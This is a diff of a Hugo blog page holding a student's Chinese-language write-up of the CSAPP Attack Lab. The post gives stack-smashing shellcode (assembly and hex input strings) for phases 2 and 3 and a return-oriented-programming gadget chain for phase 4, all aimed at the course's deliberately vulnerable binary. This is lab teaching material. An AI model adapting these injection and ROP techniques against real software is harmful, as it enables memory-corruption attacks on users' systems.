@@ -23,7 +23,7 @@
 
 
 
-<meta name="generator" content="Hugo 0.53 with even 4.0.0" />
+<meta name="generator" content="Hugo 0.60.1 with theme even" />
 
 
 <link rel="canonical" href="https://humpylin.github.io/post/csapp/attacklab/" />
@@ -34,28 +34,25 @@
 <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
 
 
-<link href="/dist/even.66a860a0.min.css" rel="stylesheet">
+<link href="/dist/even.c2a46f00.min.css" rel="stylesheet">
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
 
 
 <meta property="og:title" content="CSAPP - Attack Lab 记录" />
 <meta property="og:description" content="Phase 1 先根据提示，读一下 getbuf 的源代码，可以发现 BUFFER_SIZE 的大小为 0x28 ，也就是 40 个字节。继续读汇编代码可以发现，touch1 的地址为 0x04017c0 。于是只要先输入 40 个任" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://humpylin.github.io/post/csapp/attacklab/" /><meta property="article:published_time" content="2019-08-08T20:17:53&#43;08:00"/>
-<meta property="article:modified_time" content="2019-08-08T20:17:53&#43;08:00"/>
-
+<meta property="og:url" content="https://humpylin.github.io/post/csapp/attacklab/" />
+<meta property="article:published_time" content="2019-08-08T20:17:53+08:00" />
+<meta property="article:modified_time" content="2019-08-08T20:17:53+08:00" />
 <meta itemprop="name" content="CSAPP - Attack Lab 记录">
 <meta itemprop="description" content="Phase 1 先根据提示，读一下 getbuf 的源代码，可以发现 BUFFER_SIZE 的大小为 0x28 ，也就是 40 个字节。继续读汇编代码可以发现，touch1 的地址为 0x04017c0 。于是只要先输入 40 个任">
-
-
 <meta itemprop="datePublished" content="2019-08-08T20:17:53&#43;08:00" />
 <meta itemprop="dateModified" content="2019-08-08T20:17:53&#43;08:00" />
-<meta itemprop="wordCount" content="975">
+<meta itemprop="wordCount" content="936">
 
 
 
-<meta itemprop="keywords" content="CSAPP,CSAPP Lab," />
-<meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="CSAPP,CSAPP Lab," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="CSAPP - Attack Lab 记录"/>
 <meta name="twitter:description" content="Phase 1 先根据提示，读一下 getbuf 的源代码，可以发现 BUFFER_SIZE 的大小为 0x28 ，也就是 40 个字节。继续读汇编代码可以发现，touch1 的地址为 0x04017c0 。于是只要先输入 40 个任"/>
 
@@ -86,6 +83,8 @@
         <li class="mobile-menu-item">Home</li>
       </a><a href="/post/">
         <li class="mobile-menu-item">Archives</li>
+      </a><a href="/drafts/">
+        <li class="mobile-menu-item">Drafts</li>
       </a><a href="/tags/">
         <li class="mobile-menu-item">Tags</li>
       </a><a href="/categories/">
@@ -105,6 +104,8 @@
         <a class="menu-item-link" href="/">Home</a>
       </li><li class="menu-item">
         <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/drafts/">Drafts</a>
       </li><li class="menu-item">
         <a class="menu-item-link" href="/tags/">Tags</a>
       </li><li class="menu-item">
@@ -135,154 +136,63 @@
   <h2 class="post-toc-title">Contents</h2>
   <div class="post-toc-content always-active">
     <nav id="TableOfContents">
-<ul>
-<li>
-<ul>
-<li><a href="#phase-1">Phase 1</a></li>
-<li><a href="#phase-2">Phase 2</a></li>
-<li><a href="#phase-3">Phase 3</a></li>
-<li><a href="#phase-4">Phase 4</a></li>
-<li><a href="#phase-5">Phase 5</a></li>
-<li><a href="#收获">收获</a></li>
-</ul></li>
-</ul>
+  <ul>
+    <li><a href="#phase-1">Phase 1</a></li>
+    <li><a href="#phase-2">Phase 2</a></li>
+    <li><a href="#phase-3">Phase 3</a></li>
+    <li><a href="#phase-4">Phase 4</a></li>
+    <li><a href="#phase-5">Phase 5</a></li>
+    <li><a href="#heading">收获</a></li>
+  </ul>
 </nav>
   </div>
 </div>
     <div class="post-content">
-      
-
-<h2 id="phase-1">Phase 1</h2>
-
+      <h2 id="phase-1">Phase 1</h2>
 <p>先根据提示，读一下 getbuf 的源代码，可以发现 BUFFER_SIZE 的大小为 0x28 ，也就是 40 个字节。继续读汇编代码可以发现，touch1 的地址为 0x04017c0 。于是只要先输入 40 个任意字符（不是换行或者 EOF），再输入地址就可以了。这里要注意一个大小端的问题，可以先用 GDB 看看到底是怎样的，我的机器要输入的便是 <code>c0 17 40</code> 以及后面接上若干零凑成十六位。</p>
-
 <h2 id="phase-2">Phase 2</h2>
-
 <p>这一次不断需要修改返回地址，还需要修改 <code>%rdi</code> 的值。除非可以执行自己写的 <code>mov</code> 指令，否则很难修改 <code>%rdi</code> 的值，但是要如何在程序里运行自己写的代码呢？通过输入的字符串。只需要保证自己输入了一条指令，然后让 getbuf 跳转到自己写得命令即可。</p>
-
 <p>根据自己的 cookie 写好指令：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-assembly" data-lang="assembly"><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-assembly" data-lang="assembly">mov $0x59b997fa, %rdi # write my cookie into %rdi
+<pre><code class="language-assembly" data-lang="assembly">mov $0x59b997fa, %rdi # write my cookie into %rdi
 pushq $0x04017ec # touch2
-retq</code></pre></td></tr></table>
-</div>
-</div>
-<p>转换成汇编代码：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-assembly" data-lang="assembly"><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-assembly" data-lang="assembly">0000000000000000 &lt;.text&gt;:
+retq
+</code></pre><p>转换成汇编代码：</p>
+<pre><code class="language-assembly" data-lang="assembly">0000000000000000 &lt;.text&gt;:
     0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
     7:   68 ec 17 40 00          pushq  $0x4017ec
-    c:   c3                      retq</code></pre></td></tr></table>
-</div>
-</div>
-<p>通过 GDB 可以看到，运行完 Gets 时，<code>%rsp</code> 的值为 0x5561dc78 。故第二个字符串应该如下。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></pre></td>
-<td class="lntd">
-<pre class="chroma">48 c7 c7 fa 97 b9 59 68
+    c:   c3                      retq
+</code></pre><p>通过 GDB 可以看到，运行完 Gets 时，<code>%rsp</code> 的值为 0x5561dc78 。故第二个字符串应该如下。</p>
+<pre><code>48 c7 c7 fa 97 b9 59 68
 ec 17 40 00 c3 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
-78 dc 61 55 00 00 00 00</pre></td></tr></table>
-</div>
-</div>
-<h2 id="phase-3">Phase 3</h2>
-
+78 dc 61 55 00 00 00 00
+</code></pre><h2 id="phase-3">Phase 3</h2>
 <p>这一次要求参数是一个字符串，先查 ASCII 表，把 Cookie 的字符串变成十六进制的形式，我的为 <code>35 39 62 39 39 37 66 61 00</code> 。然后和 phase 2 一样，写好传参的代码。这里一开始改变了栈指针，是因为我选择把字符串放在最后，然后通过移动栈指针来保护字符串，字符串本身的九个字符以及之前 ret 的地址，共需要移动 17 个字节。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-assembly" data-lang="assembly"><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-assembly" data-lang="assembly">sub $0x11, %rsp
+<pre><code class="language-assembly" data-lang="assembly">sub $0x11, %rsp
 mov %rsp, %rdi
 pushq $0x4018fa
-retq</code></pre></td></tr></table>
-</div>
-</div>
-<p>转换成汇编代码。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-assembly" data-lang="assembly"><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-assembly" data-lang="assembly">Disassembly of section .text:
+retq
+</code></pre><p>转换成汇编代码。</p>
+<pre><code class="language-assembly" data-lang="assembly">Disassembly of section .text:
 
 0000000000000000 &lt;.text&gt;:
    0:   48 83 ec 11             sub    $0x11,%rsp
    4:   48 89 e7                mov    %rsp,%rdi
    7:   68 fa 18 40 00          pushq  $0x4018fa
-   c:   c3                      retq</code></pre></td></tr></table>
-</div>
-</div>
-<p>然后写成十六进制形式，需要把字符串放置于 return 地址的前面。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></pre></td>
-<td class="lntd">
-<pre class="chroma">48 83 ec 11 48 89 e7 68
+   c:   c3                      retq
+</code></pre><p>然后写成十六进制形式，需要把字符串放置于 return 地址的前面。</p>
+<pre><code>48 83 ec 11 48 89 e7 68
 fa 18 40 00 c3 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 35
 39 62 39 39 37 66 61 00
-78 dc 61 55 00 00 00 00</pre></td></tr></table>
-</div>
-</div>
-<h2 id="phase-4">Phase 4</h2>
-
+78 dc 61 55 00 00 00 00
+</code></pre><h2 id="phase-4">Phase 4</h2>
 <p>这一次是要利用 gadgets 来实现攻击，我们要执行的汇编代码应该先通过 pop 将 cookie 传给 <code>%rdi</code> ，然后再返回到 touch 2 函数。不过查看 start farm 到 mid farm 中间的函数，并没有 <code>5f</code> 可以使用，那么不妨先将 cookie 传给某个中间寄存器，再传给 <code>%rdi</code> ，阅读函数，发现 <code>addval_219</code> 以及 <code>setval_426</code> 可以做到。</p>
-
 <p>那么本题字符串如下。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></pre></td>
-<td class="lntd">
-<pre class="chroma">00 00 00 00 00 00 00 00 
+<pre><code>00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
@@ -290,15 +200,10 @@ fa 18 40 00 c3 00 00 00
 ab 19 40 00 00 00 00 00
 fa 97 b9 59 00 00 00 00 
 c5 19 40 00 00 00 00 00
-ec 17 40 00 00 00 00 00</pre></td></tr></table>
-</div>
-</div>
-<h2 id="phase-5">Phase 5</h2>
-
+ec 17 40 00 00 00 00 00
+</code></pre><h2 id="phase-5">Phase 5</h2>
 <p>（既然文档都不断规劝我不要做了，那我就不做了吧……）</p>
-
-<h2 id="收获">收获</h2>
-
+<h2 id="heading">收获</h2>
 <p>对两种攻击方式有了更深的了解，不过似乎这些方式在加入了金丝雀数的后都无法奏效了。另外也明白了缓冲区溢出的危险。</p>
 
     </div>
@@ -348,7 +253,7 @@ ec 17 40 00 00 00 00 00</pre></td></tr></table>
     })();
     </script>
     <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-  
+
   
 
   
